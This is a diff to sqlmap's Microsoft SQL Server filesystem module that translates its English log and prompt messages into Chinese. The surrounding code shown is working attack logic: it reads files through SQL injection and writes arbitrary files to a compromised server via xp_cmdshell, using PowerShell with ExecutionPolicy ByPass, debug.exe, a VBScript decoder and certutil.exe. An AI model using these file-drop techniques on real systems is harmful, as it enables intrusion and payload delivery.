@@ -67,11 +67,11 @@ class Filesystem(GenericFilesystem):
         chunkName = randomStr(lowercase=True)
         fileScrLines = self._dataToScr(fileContent, chunkName)
 
-        logger.debug("uploading debug script to %s\\%s, please wait.." % (tmpPath, randScr))
+        logger.debug("正在将调试脚本上传到 %s\\%s,请稍候.." % (tmpPath, randScr))
 
         self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)
 
-        logger.debug("generating chunk file %s\\%s from debug script %s" % (tmpPath, chunkName, randScr))
+        logger.debug("生成调试脚本 %s\\%s 中的文件 %s" % (tmpPath, chunkName, randScr))
 
         commands = (
             "cd \"%s\"" % tmpPath,
@@ -85,7 +85,7 @@ class Filesystem(GenericFilesystem):
 
     def stackedReadFile(self, remoteFile):
         if not kb.bruteMode:
-            infoMsg = "fetching file: '%s'" % remoteFile
+            infoMsg = "获取文件: '%s'" % remoteFile
             logger.info(infoMsg)
 
         result = []
@@ -149,8 +149,7 @@ class Filesystem(GenericFilesystem):
             count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
             if not isNumPosStrValue(count):
-                errMsg = "unable to retrieve the content of the "
-                errMsg += "file '%s'" % remoteFile
+                errMsg = "无法获取文件 '%s' 的内容" % remoteFile
                 raise SqlmapNoneDataException(errMsg)
 
             indexRange = getLimitRange(count)
@@ -164,13 +163,11 @@ class Filesystem(GenericFilesystem):
         return result
 
     def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
-        errMsg = "Microsoft SQL Server does not support file upload with "
-        errMsg += "UNION query SQL injection technique"
+        errMsg = "Microsoft SQL Server 不支持使用 UNION 查询 SQL 注入技术上传文件"
         raise SqlmapUnsupportedFeatureException(errMsg)
 
     def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):
-        infoMsg = "using PowerShell to write the %s file content " % fileType
-        infoMsg += "to file '%s'" % remoteFile
+        infoMsg = "使用 PowerShell 写入 %s 文件内容到文件 '%s'" % (fileType, remoteFile)
         logger.info(infoMsg)
 
         encodedFileContent = encodeBase64(localFileContent, binary=False)
@@ -183,7 +180,7 @@ class Filesystem(GenericFilesystem):
         localFileSize = len(encodedFileContent)
         chunkMaxSize = 1024
 
-        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)
+        logger.debug("上传 base64 编码文件到 %s,请稍候.." % encodedBase64FilePath)
 
         for i in xrange(0, localFileSize, chunkMaxSize):
             wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
@@ -194,10 +191,10 @@ class Filesystem(GenericFilesystem):
         psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
         psString += "-Path \"%s\" -Value $Content -Encoding Byte" % remoteFile
 
-        logger.debug("uploading the PowerShell base64-decoding script to %s" % randPSScriptPath)
+        logger.debug("上传 PowerShell 的 base64 解码脚本到 %s" % randPSScriptPath)
         self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)
 
-        logger.debug("executing the PowerShell base64-decoding script to write the %s file, please wait.." % remoteFile)
+        logger.debug("执行 PowerShell 的 base64 解码脚本，写入 %s 文件，请稍候.." % remoteFile)
 
         commands = (
             "powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
@@ -208,8 +205,7 @@ class Filesystem(GenericFilesystem):
         self.execCmd(" & ".join(command for command in commands))
 
     def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
-        infoMsg = "using debug.exe to write the %s " % fileType
-        infoMsg += "file content to file '%s', please wait.." % remoteFile
+        infoMsg = "使用 debug.exe 写入 %s 文件内容到文件 '%s'" % (fileType, remoteFile)
         logger.info(infoMsg)
 
         remoteFileName = ntpath.basename(remoteFile)
@@ -220,8 +216,7 @@ class Filesystem(GenericFilesystem):
         if localFileSize < debugSize:
             chunkName = self._updateDestChunk(localFileContent, tmpPath)
 
-            debugMsg = "renaming chunk file %s\\%s to %s " % (tmpPath, chunkName, fileType)
-            debugMsg += "file %s\\%s and moving it to %s" % (tmpPath, remoteFileName, remoteFile)
+            debugMsg = "将分块文件 %s\\%s 重命名为 %s 文件 %s\\%s,并将其移动到 %s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName, remoteFile)
             logger.debug(debugMsg)
 
             commands = (
@@ -232,10 +227,7 @@ class Filesystem(GenericFilesystem):
 
             self.execCmd(" & ".join(command for command in commands))
         else:
-            debugMsg = "the file is larger than %d bytes. " % debugSize
-            debugMsg += "sqlmap will split it into chunks locally, upload "
-            debugMsg += "it chunk by chunk and recreate the original file "
-            debugMsg += "on the server, please wait.."
+            debugMsg = "文件大小超过 %d 字节。sqlmap将在本地将其拆分为分块,逐个分块上传,并在服务器上重新创建原始文件,请稍候.." % debugSize
             logger.debug(debugMsg)
 
             for i in xrange(0, localFileSize, debugSize):
@@ -243,10 +235,10 @@ class Filesystem(GenericFilesystem):
                 chunkName = self._updateDestChunk(localFileChunk, tmpPath)
 
                 if i == 0:
-                    debugMsg = "renaming chunk "
+                    debugMsg = "重命名块文件 "
                     copyCmd = "ren %s %s" % (chunkName, remoteFileName)
                 else:
-                    debugMsg = "appending chunk "
+                    debugMsg = "追加块文件 "
                     copyCmd = "copy /B /Y %s+%s %s" % (remoteFileName, chunkName, remoteFileName)
 
                 debugMsg += "%s\\%s to %s file %s\\%s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
@@ -260,7 +252,7 @@ class Filesystem(GenericFilesystem):
 
                 self.execCmd(" & ".join(command for command in commands))
 
-            logger.debug("moving %s file %s to %s" % (fileType, sFile, remoteFile))
+            logger.debug("移动 %s 文件 %s 到 %s" % (fileType, sFile, remoteFile))
 
             commands = (
                 "cd \"%s\"" % tmpPath,
@@ -270,8 +262,7 @@ class Filesystem(GenericFilesystem):
             self.execCmd(" & ".join(command for command in commands))
 
     def _stackedWriteFileVbs(self, tmpPath, localFileContent, remoteFile, fileType):
-        infoMsg = "using a custom visual basic script to write the "
-        infoMsg += "%s file content to file '%s', please wait.." % (fileType, remoteFile)
+        infoMsg = "使用自定义 Visual Basic 脚本写入 %s 文件内容到文件 '%s'" % (fileType, remoteFile)
         logger.info(infoMsg)
 
         randVbs = "tmps%s.vbs" % randomStr(lowercase=True)
@@ -335,11 +326,11 @@ class Filesystem(GenericFilesystem):
         vbs = vbs.replace("    ", "")
         encodedFileContent = encodeBase64(localFileContent, binary=False)
 
-        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
+        logger.debug("上传 base64 编码文件内容到 %s,请稍候.." % randFilePath)
 
         self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)
 
-        logger.debug("uploading a visual basic decoder stub %s\\%s, please wait.." % (tmpPath, randVbs))
+        logger.debug("上传 Visual Basic 解码存根 %s\\%s,请稍候.." % (tmpPath, randVbs))
 
         self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)
 
@@ -353,8 +344,7 @@ class Filesystem(GenericFilesystem):
         self.execCmd(" & ".join(command for command in commands))
 
     def _stackedWriteFileCertutilExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
-        infoMsg = "using certutil.exe to write the %s " % fileType
-        infoMsg += "file content to file '%s', please wait.." % remoteFile
+        infoMsg = "使用 certutil.exe 写入 %s 文件内容到文件 '%s'" % (fileType, remoteFile)
         logger.info(infoMsg)
 
         chunkMaxSize = 500
@@ -366,11 +356,11 @@ class Filesystem(GenericFilesystem):
 
         splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i + chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])
 
-        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
+        logger.debug("上传 base64 编码文件内容到 %s,请稍候.." % randFilePath)
 
         self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)
 
-        logger.debug("decoding the file to %s.." % remoteFile)
+        logger.debug("解码文件到 %s.." % remoteFile)
 
         commands = (
             "cd \"%s\"" % tmpPath,
@@ -397,24 +387,21 @@ class Filesystem(GenericFilesystem):
         written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
 
         if written is False:
-            message = "do you want to try to upload the file with "
-            message += "the custom Visual Basic script technique? [Y/n] "
+            message = "您是否想尝试使用自定义 Visual Basic 脚本上传文件？[Y/n] "
 
             if readInput(message, default='Y', boolean=True):
                 self._stackedWriteFileVbs(tmpPath, localFileContent, remoteFile, fileType)
                 written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
 
         if written is False:
-            message = "do you want to try to upload the file with "
-            message += "the built-in debug.exe technique? [Y/n] "
+            message = "您是否想尝试使用内置的 debug.exe 技术上传文件？[Y/n] "
 
             if readInput(message, default='Y', boolean=True):
                 self._stackedWriteFileDebugExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                 written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
 
         if written is False:
-            message = "do you want to try to upload the file with "
-            message += "the built-in certutil.exe technique? [Y/n] "
+            message = "您是否想尝试使用内置的 certutil.exe 技术上传文件？[Y/n] "
 
             if readInput(message, default='Y', boolean=True):
                 self._stackedWriteFileCertutilExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
